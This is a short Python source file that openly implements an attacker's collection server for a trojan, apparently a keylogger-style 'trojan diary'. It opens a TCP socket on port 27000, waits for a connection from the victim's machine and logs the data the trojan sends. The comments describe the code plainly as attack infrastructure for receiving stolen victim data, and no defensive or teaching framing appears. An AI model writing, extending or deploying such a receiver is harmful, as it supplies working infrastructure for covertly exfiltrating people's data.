#!/usr/bin/env python3

""" Implementation of the server that collects data sent by trojan.
"""

import logging
import socket


class Server:
    """ This class represents a server of the attacker that
    collects data from the victim.
    """

    def __init__(self, port):
        self._port = port
        # Initialize the socket for connection.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    @property
    def socket(self):
        """ Server socket. """
        return self._socket

    def initialize(self):
        """ Initialize server before session. """
        try:
            self.socket.bind(('localhost', self._port))
            self.socket.listen()
            logging.debug('Server was successfully initialized.')
        except socket.error:
            print('Server was not initialized due to an error.')

    def collect_data(self):
        """ Collect data from client trojan application. """
        # Establish a connection with the victim.
        connection, address = self.socket.accept()
        with connection:
            print('Connection with trojan established from {}'.format(address))

            # Receive data sent by trojan diary.
            while True:
                data = connection.recv(1024)
                if not data:
                    break
                logging.info(data)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create and initialize a server running on attacker's side.
    server = Server(27000)
    server.initialize()
    # Collect the data sent by trojan that was executed on victim's side.
    server.collect_data()
